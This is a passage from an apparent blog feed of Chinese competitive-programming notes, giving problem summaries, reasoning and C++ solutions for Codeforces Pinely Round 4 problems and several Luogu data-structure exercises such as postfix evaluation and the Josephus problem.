(arr[i] &gt; maxnum) &#123;</span><br><span class="line">      maxnum = arr[i];</span><br><span class="line">      maxpos = i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (maxpos % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">      cout &lt;&lt; arr[maxpos] &lt;&lt; endl;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      arr[maxpos] = <span class="number">0</span>;</span><br><span class="line">      maxpos = <span class="number">0</span>;</span><br><span class="line">      maxnum = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (arr[i] &gt; maxnum) &#123;</span><br><span class="line">          maxnum = arr[i];</span><br><span class="line">          maxpos = i;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> t;</span><br><span class="line">  cin &gt;&gt; t;</span><br><span class="line">  <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">    <span class="built_in">solve</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="B"><a href="#B" class="headerlink" title="B"></a>B</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240730004926588.png" alt="image-20240730004926588"></p><blockquote><p> 题意：题目要求构建一个数组 <code>a</code>，使得 <code>b[i] = a[i] &amp; a[i+1]</code> 对于所有的 <code>1 &lt;= i &lt;= n-1</code> 成立。对于给定的数组 <code>b</code>，我们需要判断是否有可能构造这样的数组 <code>a</code>，如果可能，输出任意一个符合条件的数组 <code>a</code>，否则输出 <code>-1</code>。</p></blockquote><p>通过推断，我们发现，在<code>a[1]-a[n-1]</code>的数组可以由<code>b[i-1] | b[i]</code>得到，<code>a[0]=b[0]</code>,<code>a[n] = b[n - 1]</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"><span class="type">int</span> b[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    n = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        cin &gt;&gt; b[i];</span><br><span class="line">    a[<span class="number">0</span>] = b[<span class="number">0</span>];</span><br><span class="line">    a[n] = b[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i] = b[i - <span class="number">1</span>] | b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b[i] != (a[i] &amp; a[i + <span class="number">1</span>]))</span><br><span class="line">            &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; endl;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++)</span><br><span class="line">        cout &lt;&lt; a[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240730005749819.png" alt="image-20240730005749819"></p><blockquote><p> 题意：</p><p>你有一个整数数组 <code>a</code>，需要通过一系列操作将数组中的所有元素都变为 <code>0</code>。每次操作包括以下两个步骤：</p><ol><li>选择一个整数 <code>x</code>（<code>0 ≤ x ≤ 10^9</code>）。</li><li>用 <code>|ai - x|</code> 替换每个元素 <code>ai</code>，其中 <code>|v|</code> 表示 <code>v</code> 的绝对值。</li></ol><p>例如，通过选择 <code>x=8</code>，数组 <code>[5, 7, 10]</code> 将变为 <code>[|5-8|, |7-8|, |10-8|] = [3, 1, 2]</code>。</p><p>你需要构建一个操作序列，在最多 40 次操作内将所有元素变为 <code>0</code>，或者确定这是不可能的。</p></blockquote><p>这里通过观察发现，每次的<code>x</code>都是取最大值与最小值的一半。得出题解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">5</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">arr</span><span class="params">(n)</span>, b</span>;</span><br><span class="line">  <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    cin &gt;&gt; arr[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) &#123; <span class="comment">//特判</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; arr[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//有元素不为0</span></span><br><span class="line">  <span class="keyword">while</span> (*<span class="built_in">max_element</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>()) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (b.<span class="built_in">size</span>() &gt;= <span class="number">40</span>) &#123;</span><br><span class="line">      cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; endl;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> max_elem = *<span class="built_in">max_element</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>());</span><br><span class="line">    <span class="type">int</span> min_elem = *<span class="built_in">min_element</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>());</span><br><span class="line">    <span class="type">int</span> x = (max_elem + min_elem) / <span class="number">2</span>;</span><br><span class="line">    b.<span class="built_in">push_back</span>(x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">      arr[i] = <span class="built_in">abs</span>(arr[i] - x);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    cout &lt;&lt; b.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;item : b) &#123;</span><br><span class="line">      cout &lt;&lt; item &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> t;</span><br><span class="line">  cin &gt;&gt; t;</span><br><span class="line">  <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">    <span class="built_in">solve</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="D"><a href="#D" class="headerlink" title="D"></a>D</h3><p>​    <img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240730132650430.png" alt="image-20240730132650430"></p><blockquote><p> 题意：你被给定了一个有 n 个顶点的无向图，顶点编号从 1 到 n。当且仅当<script type="math/tex">u⊕vu</script> 是一个素数时，顶点 u 和 v之间存在一条边，其中 ⊕表示按位异或运算。</p><p>你的任务是用最少的颜色对图中的所有顶点进行着色，使得没有两条直接连接的顶点具有相同的颜色。</p></blockquote><p>由于自然数中最小的不是质数的数是4，且由异或性质可知，连续四个数异或的二进制<code>低两位</code>是一定不同的。</p><p>因此考虑让同色的数之间的异或值都是 4 的倍数就可以构造一种符合要求的做法</p><p>显然将所有数按照它们模 4 的余数分组，同组数染一种颜色即可，这样组内任意两数异或值都是 4 的倍数</p><p>参考博客<a href="https://www.cnblogs.com/cjjsb/p/18330970#d-prime-xor-coloring">Pinely Round 4 (Div. 1 + Div. 2) - 空気力学の詩 - 博客园 (cnblogs.com)</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> t,n;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;t);t;--t)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">if</span> (n==<span class="number">1</span>) <span class="built_in">puts</span>(<span class="string">&quot;1\n1&quot;</span>); <span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span> (n==<span class="number">2</span>) <span class="built_in">puts</span>(<span class="string">&quot;2\n1 2&quot;</span>); <span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span> (n==<span class="number">3</span>) <span class="built_in">puts</span>(<span class="string">&quot;2\n1 2 2&quot;</span>); <span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span> (n==<span class="number">4</span>) <span class="built_in">puts</span>(<span class="string">&quot;3\n1 2 2 3&quot;</span>); <span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span> (n==<span class="number">5</span>) <span class="built_in">puts</span>(<span class="string">&quot;3\n1 2 2 3 3&quot;</span>); <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;4&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;++i) <span class="built_in">printf</span>(<span class="string">&quot;%d%c&quot;</span>,i%<span class="number">4</span><span class="number">+1</span>,<span class="string">&quot; \n&quot;</span>[i==n]);</span><br><span class="line">            <span class="comment">//i！=n时输出第一个&quot; &quot;，当n==i时输出\n</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> codeforces </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> codeforces </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷题单——数据结构0x1</title>
      <link href="/2024/07/26/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%840x1/"/>
      <url>/2024/07/26/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%840x1/</url>
      
        <content type="html"><![CDATA[<h3 id="P3156-询问学号"><a href="#P3156-询问学号" class="headerlink" title="P3156 询问学号"></a>P3156 询问学号</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240726103035952.png" alt="image-20240726103035952"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> u32 = <span class="type">unsigned</span>;</span><br><span class="line"><span class="keyword">using</span> i64 = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"><span class="keyword">using</span> u64 = <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span>  <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e7</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        cin &gt;&gt; x;</span><br><span class="line">        cout &lt;&lt; a[x] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P3613-【深基15-例2】寄包柜"><a href="#P3613-【深基15-例2】寄包柜" class="headerlink" title="P3613 【深基15.例2】寄包柜"></a>P3613 【深基15.例2】寄包柜</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240726103644870.png" alt="image-20240726103644870"></p><p>这题需要两次映射，看了题解，发现还可以通过嵌套map实现！</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> u32 = <span class="type">unsigned</span>;</span><br><span class="line"><span class="keyword">using</span> i64 = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"><span class="keyword">using</span> u64 = <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span>  <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">map&lt;<span class="type">int</span>, map&lt;<span class="type">int</span>, <span class="type">int</span> &gt;&gt; mp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="type">int</span> op;</span><br><span class="line">        cin &gt;&gt; op;</span><br><span class="line">        <span class="keyword">if</span>(op == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> x, y ,z;</span><br><span class="line">            cin &gt;&gt; x &gt;&gt; y &gt;&gt; z;</span><br><span class="line">            mp[x][y] = z;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> x ,y;</span><br><span class="line">            cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">            cout &lt;&lt; mp[x][y] &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1449-后缀表达式"><a href="#P1449-后缀表达式" class="headerlink" title="P1449 后缀表达式"></a>P1449 后缀表达式</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240726103948125.png" alt="image-20240726103948125"></p><p>简化版表达式求值，使用栈来存储计算值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> i64 = <span class="type">long</span> <span class="type">long</span>;</span><br><span class="line"></span><br><span class="line">stack&lt;i64&gt; st;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string s;</span><br><span class="line">    cin &gt;&gt; s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>()  - <span class="number">1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isdigit</span>(s[i]))</span><br><span class="line">        &#123;</span><br><span class="line">            i64 res = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; s.<span class="built_in">size</span>() &amp;&amp; <span class="built_in">isdigit</span>(s[i]))</span><br><span class="line">            &#123;</span><br><span class="line">                res = res * <span class="number">10</span> + (s[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            st.<span class="built_in">push</span>(res);</span><br><span class="line">  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            i64 a, b;</span><br><span class="line">            a = st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            b = st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">                st.<span class="built_in">push</span>(b + a);</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">                st.<span class="built_in">push</span>(b - a);</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                st.<span class="built_in">push</span>(b * a);</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">                st.<span class="built_in">push</span>(b / a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; st.<span class="built_in">top</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="P1996-约瑟夫问题"><a href="#P1996-约瑟夫问题" class="headerlink" title="P1996 约瑟夫问题"></a>P1996 约瑟夫问题</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240726112316478.png" alt="image-20240726112316478"></p><p>这题其实最好用队列做，当遍历到该元素时，直接出列即可。这里我是用数组模拟。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> arr[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    arr[i - <span class="number">1</span>] = i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (arr[pos]) &#123;<span class="comment">//未出队</span></span><br><span class="line">        cnt++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (cnt == m) &#123;<span class="comment">//指定元素输出，并出队（置0）</span></span><br><span class="line">        cout &lt;&lt; arr[pos] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        arr[pos] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      pos = (pos + <span class="number">1</span>) % n;<span class="comment">//下一元素</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1160-队列安排"><a href="#P1160-队列安排" class="headerlink" title="P1160 队列安排"></a>P1160 队列安排</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240730195036047.png" 